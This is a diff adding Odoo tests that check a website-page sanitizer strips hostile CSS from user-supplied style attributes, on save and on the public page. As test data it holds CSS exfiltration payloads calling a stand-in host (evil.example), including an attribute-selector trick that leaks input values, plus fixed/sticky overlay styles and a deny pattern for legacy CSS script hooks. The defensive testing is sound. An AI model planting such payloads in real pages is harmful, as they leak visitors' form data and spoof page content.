@@ -18,6 +18,7 @@ from lxml import etree
 
 from odoo.tests.common import tagged
 from odoo.addons.zero_sudo.tests.common import HamsHttpCase
+from odoo.addons.zero_sudo.tests.test_css_sanitizer import STYLE_ATTR_HOSTILE
 
 EXFIL = 'input[value^="a"]{background:url(https://evil.example/a)}'
 
@@ -122,6 +123,67 @@ class TestUserArchStyleAndLink(HamsHttpCase):
 
 
 @tagged("post_install", "-at_install")
+class TestUserArchStyleAttribute(HamsHttpCase):
+    # Tests [@ANCHOR: user_websites:page_arch_style_attribute_filter]
+    # [@ANCHOR: test_user_arch_style_attribute_filter] lives here.
+
+    def sanitize(self, arch):
+        return self.env["website.page"]._sanitize_user_arch(arch)
+
+    def _styles(self, arch):
+        root = etree.fromstring(f"<root>{arch}</root>", etree.XMLParser(recover=True))
+        return [e.get("style") for e in root.iter() if isinstance(e.tag, str) and "style" in e.attrib]
+
+    def test_01_every_bypass_is_removed_from_the_attribute(self):
+        for name, value in STYLE_ATTR_HOSTILE:
+            with self.subTest(name=name):
+                escaped = value.replace("&", "&amp;").replace('"', "&quot;").replace("<", "&lt;")
+                cleaned, modified = self.sanitize(f'<div><p style="{escaped}">x</p></div>')
+                self.assertEqual(self._styles(cleaned), [])
+                self.assertNotIn("evil.example", cleaned)
+                self.assertNotRegex(cleaned.lower(), r"fixed|sticky|expression|binding|behavior")
+                self.assertFalse(modified, "a style attribute is filtered without a strike")
+
+    def test_02_harmless_style_survives_and_hostile_part_goes(self):
+        cleaned, _ = self.sanitize(
+            '<div style="color:red;margin:0 auto"><p STYLE="COLOR:blue;'
+            'background:url(https://evil.example/a);position:fixed">x</p></div>'
+        )
+        self.assertEqual(self._styles(cleaned), ["color:red;margin:0 auto", "color:blue"])
+
+    def test_03_malformed_attribute_is_dropped_whole_and_empty_one_removed(self):
+        cleaned, _ = self.sanitize(
+            '<div><p style="color:red;/* open">a</p><p style="">b</p><p style="  ">c</p>'
+            '<p style="position:fixed">d</p></div>'
+        )
+        self.assertEqual(self._styles(cleaned), [])
+        self.assertNotIn("style=", cleaned)
+        self.assertIn(">a<", cleaned)
+
+    def test_04_every_element_and_nesting_is_covered(self):
+        cleaned, _ = self.sanitize(
+            '<t t-name="x"><section style="position:sticky"><ul><li style="list-style-image:url(https://evil.example/b)">'
+            '<span style="color:red">x</span></li></ul></section><img src="a.png" style="background:url(//evil.example/a)"/></t>'
+        )
+        self.assertEqual(self._styles(cleaned), ["color:red"])
+        self.assertNotIn("evil.example", cleaned)
+
+    def test_05_style_attribute_inside_svg_still_uses_the_svg_filter(self):
+        cleaned, _ = self.sanitize(
+            "<div><svg viewBox='0 0 9 9'><rect width='3' height='3' style='fill:red;background:url(https://evil.example/a)'/></svg></div>"
+        )
+        self.assertNotIn("evil.example", cleaned)
+
+    def test_06_sanitizing_twice_changes_nothing(self):
+        once, _ = self.sanitize(
+            '<div style="COLOR:red;background:url(https://evil.example/a)"><p style="position:fixed">x</p></div>'
+        )
+        twice, modified = self.sanitize(once)
+        self.assertEqual(twice, once)
+        self.assertFalse(modified)
+
+
+@tagged("post_install", "-at_install")
 class TestMemberPageStyleLinkOnSavePath(HamsHttpCase):
     """The member's own create/write and the public page that comes out."""
 
@@ -188,3 +250,28 @@ class TestMemberPageStyleLinkOnSavePath(HamsHttpCase):
         self.assertEqual(response.status_code, 200)
         self.assertIn("marker-styled", response.text)
         self.assertNotIn("evil.example", response.text)
+
+    def test_03_style_attribute_is_filtered_on_create_write_and_public_page(self):
+        reports = self.env["content.violation.report"]
+        before = reports.search_count([("content_owner_id", "=", self.member.id)])
+        arch = (
+            "<t name='Styled'><div style='color:red;position:fixed;inset:0'>"
+            "<p id='marker-attr' style=\"background:url(https://evil.example/px);margin:0\">hello</p>"
+            "<p style='position:-webkit-sticky'>y</p></div></t>"
+        )
+        page = self._page(arch)
+        for stored in (page.arch,):
+            self.assertNotIn("evil.example", stored)
+            self.assertNotIn("fixed", stored)
+            self.assertNotIn("sticky", stored)
+            self.assertIn("color:red", stored)
+            self.assertIn("margin:0", stored)
+        page.with_user(self.member).write({"arch": arch})
+        self.assertNotIn("evil.example", page.arch)
+        self.assertNotIn("fixed", page.arch)
+        self.assertEqual(reports.search_count([("content_owner_id", "=", self.member.id)]), before)
+        self.env.flush_all()
+        response = self.url_open(f"/{self.member.website_slug}/styled")
+        self.assertEqual(response.status_code, 200)
+        self.assertIn("marker-attr", response.text)
+        self.assertNotIn("evil.example/px", response.text)
